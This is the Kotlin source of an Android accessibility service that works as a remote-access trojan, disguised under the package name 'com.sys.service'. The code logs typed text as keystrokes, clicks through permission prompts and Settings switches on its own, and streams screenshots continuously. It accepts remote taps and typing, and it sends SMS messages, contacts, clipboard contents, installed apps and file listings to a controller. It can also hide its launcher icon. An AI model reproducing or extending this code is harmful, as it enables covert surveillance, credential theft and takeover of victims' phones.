package com.sys.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.admin.DevicePolicyManager
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Path
import android.os.BatteryManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Base64
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File

class AccSvc : AccessibilityService() {

    private val h = Handler(Looper.getMainLooper())
    @Volatile private var streaming = false
    @Volatile private var busy = false
    @Volatile private var typing = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        Exec.svc = this
        h.postDelayed({ stream(true) }, 700)
        MainActivity.alive?.advance()
    }

    override fun onUnbind(i: Intent?): Boolean { Exec.svc = null; streaming = false; return true }
    override fun onInterrupt() {}

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        val ev = e ?: return
        val pkg = ev.packageName?.toString().orEmpty()
        if (!typing && ev.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val t = ev.text?.lastOrNull()?.toString()
            if (!t.isNullOrBlank()) Net.send(mapOf("c" to "k", "t" to t, "p" to pkg))
        }
        if (ev.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val root = rootInActiveWindow ?: return
        if (pkg.contains("permissioncontroller") || pkg == "com.android.systemui") clickAllow(root)
        else if (pkg == "com.android.settings" && clickSwitch(root)) {
            h.postDelayed({ global(GLOBAL_ACTION_BACK) }, 500)
        }
    }

    private fun clickAllow(root: AccessibilityNodeInfo) {
        val ids = listOf("permission_allow_all_button", "permission_allow_foreground_only_button",
            "permission_allow_button", "permission_allow_one_time_button")
        for (id in ids) for (p in listOf("com.android.permissioncontroller",
            "com.google.android.permissioncontroller")) {
            val n = root.findAccessibilityNodeInfosByViewId(p + ":id/" + id).firstOrNull()
            if (n != null) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
        }
        val words = listOf("Allow", "While using the app", "Allow all the time", "Start now",
            "Allow all", "Izinkan", "Erlauben", "Autoriser", "允许", "अनुमति दें")
        if (clickText(root, words)) return
        val btns = mutableListOf<AccessibilityNodeInfo>()
        collect(root, btns) { it.isClickable && it.className == "android.widget.Button" }
        btns.lastOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    private fun clickText(root: AccessibilityNodeInfo, words: List<String>): Boolean {
        val list = mutableListOf<AccessibilityNodeInfo>()
        collect(root, list) { n -> words.any { n.text?.toString()?.contains(it, true) == true } }
        val n = list.lastOrNull() ?: return false
        n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        return true
    }

    private fun clickSwitch(root: AccessibilityNodeInfo): Boolean {
        val list = mutableListOf<AccessibilityNodeInfo>()
        collect(root, list) { it.isCheckable || it.className == "android.widget.Switch" }
        val n = list.firstOrNull { !it.isChecked } ?: return false
        n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        return true
    }

    private fun collect(n: AccessibilityNodeInfo, out: MutableList<AccessibilityNodeInfo>,
                        pick: (AccessibilityNodeInfo) -> Boolean) {
        if (pick(n)) out.add(n)
        for (i in 0 until n.childCount) n.getChild(i)?.let { collect(it, out, pick) }
    }

    private val tick = object : Runnable {
        override fun run() {
            if (!streaming) return
            if (!busy && Net.online) shot()
            h.postDelayed(this, 850)
        }
    }

    fun stream(on: Boolean) { streaming = on; if (on) h.post(tick) }
    fun oneShot() { if (!busy) shot() }

    private fun shot() {
        busy = true
        takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
            override fun onSuccess(r: ScreenshotResult) {
                try {
                    val full = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                    if (full != null) {
                        val s = Bitmap.createScaledBitmap(full, full.width / 2, full.height / 2, true)
                        val bo = ByteArrayOutputStream()
                        s.compress(Bitmap.CompressFormat.JPEG, 55, bo)
                        Net.frame(Base64.encodeToString(bo.toByteArray(), Base64.NO_WRAP),
                            s.width, s.height)
                    }
                } catch (_: Throwable) {
                } finally {
                    r.hardwareBuffer.close()
                    busy = false
                }
            }
            override fun onFailure(e: Int) { busy = false }
        })
    }

    fun tap(x: Float, y: Float) {
        val p = Path().apply { moveTo(x, y) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(p, 0, 60)).build(), null, null)
    }

    fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, ms: Long) {
        val p = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(p, 0, ms.coerceAtLeast(80)))
            .build(), null, null)
    }

    fun type(t: String) {
        val n = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
        typing = true
        val b = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, t)
        }
        n.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b)
        h.postDelayed({ typing = false }, 500)
    }

    fun global(a: Int) = performGlobalAction(a)

    fun lock() { runCatching { getSystemService(DevicePolicyManager::class.java).lockNow() } }

    fun info() {
        val dpm = getSystemService(DevicePolicyManager::class.java)
        Net.send(mapOf(
            "c" to "info", "model" to android.os.Build.MODEL, "brand" to android.os.Build.BRAND,
            "sdk" to android.os.Build.VERSION.SDK_INT, "rel" to android.os.Build.VERSION.RELEASE,
            "do" to dpm.isDeviceOwnerApp(packageName),
            "bat" to getSystemService(BatteryManager::class.java)
                .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY),
            "fg" to (rootInActiveWindow?.packageName?.toString() ?: "")))
    }

    fun apps() {
        val arr = JSONArray()
        packageManager.getInstalledPackages(0).forEach {
            arr.put(JSONObject().put("p", it.packageName)
                .put("l", runCatching {
                    it.applicationInfo.loadLabel(packageManager).toString()
                }.getOrDefault(""))
                .put("s", it.applicationInfo.sourceDir))
        }
        Net.send(mapOf("c" to "apps", "d" to arr.toString()))
    }

    fun files(p: String) {
        val arr = JSONArray()
        runCatching {
            File(p).listFiles()?.sortedBy { it.name }?.forEach {
                arr.put(JSONObject().put("n", it.name).put("dir", it.isDirectory)
                    .put("sz", it.length()).put("p", it.absolutePath))
            }
        }
        Net.send(mapOf("c" to "files", "p" to p, "d" to arr.toString()))
    }

    fun sms(n: Int) {
        val arr = JSONArray()
        runCatching {
            contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC")?.use { c ->
                var i = 0
                while (c.moveToNext() && i++ < n) {
                    arr.put(JSONObject()
                        .put("a", c.getString(c.getColumnIndexOrThrow("address")))
                        .put("b", c.getString(c.getColumnIndexOrThrow("body")))
                        .put("t", c.getLong(c.getColumnIndexOrThrow("date"))))
                }
            }
        }
        Net.send(mapOf("c" to "sms", "d" to arr.toString()))
    }

    fun contacts() {
        val arr = JSONArray()
        runCatching {
            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null)?.use { c ->
                var i = 0
                while (c.moveToNext() && i++ < 500) {
                    arr.put(JSONObject()
                        .put("n", c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                        .put("p", c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER))))
                }
            }
        }
        Net.send(mapOf("c" to "contacts", "d" to arr.toString()))
    }

    fun clip() {
        val cm = getSystemService(ClipboardManager::class.java)
        val t = cm.primaryClip?.takeIf { it.itemCount > 0 }
            ?.getItemAt(0)?.coerceToText(this)?.toString().orEmpty()
        Net.send(mapOf("c" to "clip", "d" to t))
    }

    fun hide(v: Boolean) {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            if (v) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            else PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP)
    }

    fun killSelf() {
        stopForeground(STOP_FOREGROUND_REMOVE)
        android.os.Process.killProcess(android.os.Process.myPid())
    }
}
